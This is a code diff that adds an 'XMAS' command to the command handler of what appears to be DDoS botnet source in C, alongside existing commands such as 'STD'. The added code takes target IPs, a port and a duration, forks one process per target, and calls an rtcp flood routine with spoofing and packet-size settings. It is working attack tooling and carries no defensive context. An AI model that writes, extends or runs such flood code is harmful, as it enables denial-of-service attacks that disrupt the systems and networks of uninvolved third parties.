@@ -886,6 +886,34 @@ void processCmd(int argc, unsigned char *argv[]) {
 							_exit(0);
 						}
         }
+
+                if(!strcmp(argv[0], "XMAS")){
+            if(argc < 4 || atoi(argv[3]) > 10000){
+                return;
+            }
+            unsigned char *ip = argv[1];
+            int port = atoi(argv[2]);
+            int time = atoi(argv[3]);
+            int spoofed = 32;
+            int pollinterval = 10;
+            int psize = 1024;
+
+            if(strstr(ip, ",") != NULL){
+                unsigned char *hi = strtok(ip, ",");
+                while(hi != NULL){
+                    if(!listFork()){
+                        rtcp(hi, port, time, spoofed, psize, pollinterval);
+                        _exit(0);
+                    }
+                    hi = strtok(NULL, ",");
+                }
+            } else {
+                if (listFork()) { return; }
+                rtcp(ip, port, time, spoofed, psize, pollinterval);
+                _exit(0);
+            }
+        }
+        
 		if(!strcmp(argv[0], "STD"))
 		{
 			if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
